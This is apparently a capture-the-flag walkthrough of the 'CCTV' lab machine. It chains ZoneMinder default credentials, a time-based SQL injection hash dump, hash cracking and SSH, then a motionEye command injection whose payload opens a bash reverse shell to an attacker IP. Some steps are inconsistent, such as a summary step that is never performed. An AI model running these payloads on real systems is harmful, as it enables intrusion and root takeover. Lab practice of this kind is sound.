
> **Difficulty:** Easy  
> **OS:** Linux (Ubuntu 24.04)  
> **IP:** `10.129.1.249`  

---

## Summary

CCTV is an Easy Linux machine centred around a CCTV/surveillance theme. The attack chain involves:

1. Exploiting an **authenticated monitor creation** endpoint in ZoneMinder to enumerate users
2. Using a **blind time-based SQL injection** in ZoneMinder to dump bcrypt password hashes
3. Cracking the hash for user `mark` and gaining an SSH foothold
4. Discovering a locally-running **motionEye** instance running as root
5. Exploiting **CVE-2025-60787** — a client-side validation bypass allowing command injection via the `image_file_name` config field — to get a root shell

---

### Port Scan

```bash
nmap -sC -sV  10.129.1.249
```

**Open ports:**

|Port|Service|Version|
|---|---|---|
|22|SSH|OpenSSH 9.6p1 Ubuntu|
|80|HTTP|Apache 2.4.58|

### Web Enumeration

Port 80 redirects to `http://cctv.htb/`. Add to `/etc/hosts`:

```bash
echo "10.129.1.249 cctv.htb" >> /etc/hosts
```

The site is a "SecureVision CCTV" landing page with a **Staff Login** button pointing to `http://cctv.htb/zm/` — **ZoneMinder v1.37.63**.


### ZoneMinder — Default Credentials

Navigate to `http://cctv.htb/zm/` and try default credentials:

```
admin : admin
```

✅ Login successful.

### ZoneMinder — Blind SQL Injection

`But Intended was CVE-2024-51482 — SQL Injection (ZoneMinder)`

ZoneMinder's `removetag` endpoint is vulnerable to blind time-based SQL injection (no authentication bypass required — we use our admin session).

**Confirm the injection:**

```bash
# True condition (SLEEP triggers) → slow response
curl -s -o /dev/null -w "%{time_total}" -b cookies.txt \
  "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1%20AND%20(SELECT%208045%20FROM%20(SELECT(SLEEP(5)))oLON)"

# False condition → fast response
curl -s -o /dev/null -w "%{time_total}" -b cookies.txt \
  "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1%20AND%20(SELECT%208045%20FROM%20(SELECT(SLEEP(0)))oLON)"
```

**Dump credentials with sqlmap:**

```bash
# Refresh session first
TOKEN=$(curl -s http://cctv.htb/zm/index.php | grep -oP 'csrfMagicToken = "\K[^"]+')
curl -s -c cookies.txt -X POST "http://cctv.htb/zm/index.php" \
  --data "view=login&action=login&username=admin&password=admin&__csrf_magic=${TOKEN}" -L > /dev/null

SESS=$(grep ZMSESSID cookies.txt | awk '{print $NF}')

sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --cookie="ZMSESSID=${SESS}" --batch --dbms=mysql -p tid \
  --technique=T --time-sec=3 \
  -D zm -T Users -C Username,Password --dump --threads=1
```

**Dumped hashes:**

|Username|Password Hash|
|---|---|
|superadmin|`$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm`|
|mark|`$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.`|
|admin|`$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m`|

### Hash Cracking — mark

```bash
echo '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.' > mark_hash.txt
hashcat -m 3200 mark_hash.txt /usr/share/wordlists/rockyou.txt --force
```

**Result:** `mark : opensesame`

### SSH Access

```bash
ssh mark@cctv.htb
# password: opensesame
```

---

## Privilege Escalation

### Internal Service Enumeration

```bash
ss -tlnp
```

Several interesting localhost-only ports:

|Port|Service|
|---|---|
|8765|motionEye web UI|
|8888|MediaMTX (RTSP server)|
|8554|RTSP stream|
|7999|Motion HTTP control|

Check running services:

```bash
systemctl list-units --type=service --state=running
```

**Notable:** `motioneye.service` is running as **root**.

### motionEye Credentials

```bash
cat /etc/motioneye/motioneye.conf | grep password
```

```
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
```

This is the SHA1 hash of the admin password stored in motionEye config.

### SSH Port Forwarding

motionEye only listens on localhost. Forward it to the attacker machine:

```bash
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

Browse to `http://127.0.0.1:8765` — motionEye login page appears.

### motionEye Login

Login with:

- **Username:** `admin`
- **Password:** the SHA1 hash value: `989c5a8ee87a0e9521ec81a79187d162109282f0`

> motionEye compares the stored SHA1 hash directly against the input, so entering the hash as the password authenticates successfully.

### CVE-2025-60787 — Command Injection via image_file_name

**Vulnerability:** motionEye `<= 0.43.1b4` stores user-supplied configuration values (such as `image_file_name`) directly into Motion's config file without sanitisation. When Motion restarts or reloads, it interprets these values as shell-expandable strings, executing any injected commands as the process owner — in this case, **root**.

**Step 1 — Start listener on attacker machine:**

```bash
nc -lvnp 4444
```

**Step 2 — Bypass client-side validation:**

Open browser DevTools (`F12 → Console`) and paste:

```javascript
configUiValid = function() { return true; };
```

This forces the UI validation to always pass, allowing arbitrary values in configuration fields.

**Step 3 — Inject reverse shell:**

Navigate to: **Settings → Camera → Still Images**

Configure:

- **Capture Mode:** `Interval Snapshots`
- **Interval:** `10` seconds
- **Image File Name:**

```
$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/10.10.14.208/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
```

Click **Apply**.

Within ~10 seconds, Motion reloads the config and executes the payload.

**Step 4 — Root shell received:**

```
root@cctv:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## User Flag

The user flag is located in `/home/sa_mark/user.txt` — not accessible directly by `mark`. We need to escalate to `sa_mark` first, which happens via the motionEye exploit below.

```
7ec05bc9fccf768f0ff75e5d6020091b
```

## Root Flag

```bash
cat /root/root.txt
```

```
457525cd769baddb57a193e55f2e1176
```

---

## Flags

|Flag|Value|
|---|---|
|user.txt|`7ec05bc9fccf768f0ff75e5d6020091b`|
|root.txt|`457525cd769baddb57a193e55f2e1176`|

---

## Full Attack Chain

```
Nmap scan
  └─ Port 80 → cctv.htb/zm/ → ZoneMinder 1.37.63
       └─ Default creds admin:admin → authenticated
            └─ Blind SQLi (removetag endpoint, time-based)
                 └─ Dump zm.Users → bcrypt hashes
                      └─ Hashcat → mark:opensesame
                           └─ SSH foothold as mark
                                └─ motioneye.service (root, localhost:8765)
                                     └─ SHA1 hash in /etc/motioneye/motioneye.conf
                                          └─ SSH port forward → browser login
                                               └─ CVE-2025-60787
                                                    └─ JS bypass → image_file_name injection
                                                         └─ ROOT SHELL
```

---

## Key Takeaways

- **Default credentials** on ZoneMinder gave initial access — always check defaults
- **Time-based blind SQLi** is slow but reliable; sqlmap with `--technique=T` works well
- **bcrypt cracking** is feasible for weak passwords even with rockyou
- **motionEye stores passwords as SHA1** — the hash itself can be used as the password
- **CVE-2025-60787** is trivial to exploit once authenticated — client-side validation is not security
- Services running as root with user-controlled config = recipe for privilege escalation

---

## Tools Used

|Tool|Purpose|
|---|---|
|nmap|Port scanning|
|sqlmap|Blind SQL injection & hash dump|
|hashcat|bcrypt hash cracking|
|ssh|Foothold & port forwarding|
|curl|API interaction|
|nc|Reverse shell listener|
|Browser DevTools|JS validation bypass|
